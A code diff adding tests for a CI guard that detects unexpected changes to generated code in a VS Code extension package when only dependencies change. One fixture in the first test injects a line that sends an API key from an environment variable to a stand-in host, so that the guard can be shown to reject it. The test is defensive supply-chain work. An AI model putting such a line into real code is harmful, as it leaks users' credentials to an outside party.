@@ -55,6 +55,38 @@ interface SmokeInstallAssertions {
   assertInstalledFile(installedExtensionPath: string, relativePath: string): void;
 }
 
+interface GeneratedEntryMetadata {
+  bytes: number;
+  sha256: string;
+}
+
+interface GeneratedEntryDiff {
+  path: string;
+  base: GeneratedEntryMetadata | null;
+  head: GeneratedEntryMetadata | null;
+}
+
+interface DependencyVsixDiffGuard {
+  assertDependencyOnlyVsixDiff(options: {
+    allowlist?: { version: 1; reviewedDiffs: unknown[] };
+    baseVsixPath: string;
+    changedFiles: string[];
+    headVsixPath: string;
+  }): Promise<{ status: string; reason: string; diffSha256?: string }>;
+  diffGeneratedEntries(
+    baseEntries: Map<string, GeneratedEntryMetadata>,
+    headEntries: Map<string, GeneratedEntryMetadata>,
+  ): GeneratedEntryDiff[];
+  diffSha256(generatedEntriesDiff: GeneratedEntryDiff[]): string;
+  generatedEntries(vsixPath: string): Promise<Map<string, GeneratedEntryMetadata>>;
+  parseArgs(argv: string[]): {
+    allowlistPath: string;
+    baseVsixPath: string;
+    changedFilesPath: string;
+    headVsixPath: string;
+  };
+}
+
 interface FakeRequest extends EventEmitter {
   destroy(error: Error): FakeRequest;
   setTimeout(timeoutMs: number, callback: () => void): FakeRequest;
@@ -78,6 +110,12 @@ function loadSmokeInstallAssertions(): SmokeInstallAssertions {
   return require(
     path.join(process.cwd(), "scripts/smoke-install-vsix.js"),
   ) as SmokeInstallAssertions;
+}
+
+function loadDependencyVsixDiffGuard(): DependencyVsixDiffGuard {
+  return require(
+    path.join(process.cwd(), "scripts/assert-dependency-vsix-diff.js"),
+  ) as DependencyVsixDiffGuard;
 }
 
 function tempDir(): string {
@@ -154,6 +192,133 @@ function baseRuntimeAndWasm(): { runtime: Buffer; wasm: Buffer } {
 }
 
 suite("VSIX runtime asset assertions", () => {
+  test("rejects dependency-only generated-code mutation without allowlist", async () => {
+    const dir = tempDir();
+    const guard = loadDependencyVsixDiffGuard();
+
+    try {
+      const baseDir = path.join(dir, "base");
+      const headDir = path.join(dir, "head");
+      fs.mkdirSync(baseDir);
+      fs.mkdirSync(headDir);
+      const baseVsixPath = await createFixtureVsix(baseDir, {
+        "extension/dist/extension.js": "module.exports = {};",
+      });
+      const headVsixPath = await createFixtureVsix(headDir, {
+        "extension/dist/extension.js":
+          "module.exports = {}; fetch('https://example.invalid/leak?key=' + process.env.B2_APPLICATION_KEY);",
+      });
+
+      await assert.rejects(
+        guard.assertDependencyOnlyVsixDiff({
+          baseVsixPath,
+          changedFiles: ["package-lock.json"],
+          headVsixPath,
+        }),
+        /Generated VSIX code changed/i,
+      );
+    } finally {
+      fs.rmSync(dir, { recursive: true, force: true });
+    }
+  });
+
+  test("accepts an exact reviewed dependency generated-code diff", async () => {
+    const dir = tempDir();
+    const guard = loadDependencyVsixDiffGuard();
+
+    try {
+      const baseDir = path.join(dir, "base");
+      const headDir = path.join(dir, "head");
+      fs.mkdirSync(baseDir);
+      fs.mkdirSync(headDir);
+      const baseVsixPath = await createFixtureVsix(baseDir, {
+        "extension/dist/extension.js": "module.exports = {};",
+      });
+      const headVsixPath = await createFixtureVsix(headDir, {
+        "extension/dist/extension.js": "module.exports = { updated: true };",
+      });
+      const generatedEntriesDiff = guard.diffGeneratedEntries(
+        await guard.generatedEntries(baseVsixPath),
+        await guard.generatedEntries(headVsixPath),
+      );
+
+      const result = await guard.assertDependencyOnlyVsixDiff({
+        allowlist: {
+          version: 1,
+          reviewedDiffs: [
+            {
+              reason: "Reviewed fixture output change.",
+              diffSha256: guard.diffSha256(generatedEntriesDiff),
+              generatedEntries: generatedEntriesDiff,
+            },
+          ],
+        },
+        baseVsixPath,
+        changedFiles: ["package.json", "package-lock.json"],
+        headVsixPath,
+      });
+
+      assert.strictEqual(result.status, "allowed");
+    } finally {
+      fs.rmSync(dir, { recursive: true, force: true });
+    }
+  });
+
+  test("skips dependency generated-code diff when runtime source changes", async () => {
+    const dir = tempDir();
+    const guard = loadDependencyVsixDiffGuard();
+
+    try {
+      const baseDir = path.join(dir, "base");
+      const headDir = path.join(dir, "head");
+      fs.mkdirSync(baseDir);
+      fs.mkdirSync(headDir);
+      const baseVsixPath = await createFixtureVsix(baseDir, {
+        "extension/dist/extension.js": "module.exports = {};",
+      });
+      const headVsixPath = await createFixtureVsix(headDir, {
+        "extension/dist/extension.js": "module.exports = { updated: true };",
+      });
+
+      const result = await guard.assertDependencyOnlyVsixDiff({
+        baseVsixPath,
+        changedFiles: ["package-lock.json", "src/extension.ts"],
+        headVsixPath,
+      });
+
+      assert.strictEqual(result.status, "skipped");
+      assert.match(result.reason, /runtime source changed/i);
+    } finally {
+      fs.rmSync(dir, { recursive: true, force: true });
+    }
+  });
+
+  test("dependency VSIX diff CLI rejects option flags without values", () => {
+    const guard = loadDependencyVsixDiffGuard();
+
+    for (const option of ["--allowlist", "--base", "--changed-files", "--head"]) {
+      assert.throws(() => guard.parseArgs([option]), new RegExp(`Missing value for ${option}`));
+      assert.throws(
+        () => guard.parseArgs([option, "--base"]),
+        new RegExp(`Missing value for ${option}`),
+      );
+    }
+  });
+
+  test("dependency VSIX diff CLI reports missing required flags", () => {
+    const guard = loadDependencyVsixDiffGuard();
+
+    assert.throws(() => guard.parseArgs([]), /Missing required option: --base/);
+    assert.throws(
+      () => guard.parseArgs(["--base", "base.vsix"]),
+      /Missing required option: --changed-files/,
+    );
+    assert.throws(
+      () => guard.parseArgs(["--base", "base.vsix", "--changed-files", "changed.txt"]),
+      /Missing required option: --head/,
+    );
+  });
+
   test("accepts a VSIX with the bundled sql.js WASM and loadable extension bundle", async () => {
     const dir = tempDir();
     const assertions = loadVsixAssetAssertions();
